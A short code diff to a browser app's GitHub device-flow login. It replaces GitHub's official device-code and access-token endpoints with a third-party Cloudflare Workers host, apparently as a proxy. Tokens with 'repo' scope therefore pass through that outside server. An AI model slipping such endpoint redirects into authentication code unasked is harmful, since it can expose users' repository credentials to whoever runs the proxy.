@@ -447,7 +447,7 @@
 
     async function loginWithGitHub(){
       // Device Flow: Step 1 - request device/user code
-      const deviceCodeResp = await fetch('https://github.com/login/device/code', {
+      const deviceCodeResp = await fetch('https://skibidi-toilet-727.blufir123.workers.dev/device/code', {
         method: 'POST',
         headers: {'Content-Type':'application/json', 'Accept':'application/json'},
         body: JSON.stringify({ client_id: CONFIG.CLIENT_ID, scope: 'repo' })
@@ -471,7 +471,7 @@
 
       while (Date.now() - startedAt < (expires_in * 1000)) {
         await new Promise(r => setTimeout(r, pollInterval));
-        const tokenResp = await fetch('https://github.com/login/oauth/access_token', {
+        const tokenResp = await fetch('https://skibidi-toilet-727.blufir123.workers.dev/access_token', {
           method: 'POST',
           headers: {'Content-Type':'application/json', 'Accept':'application/json'},
           body: JSON.stringify({
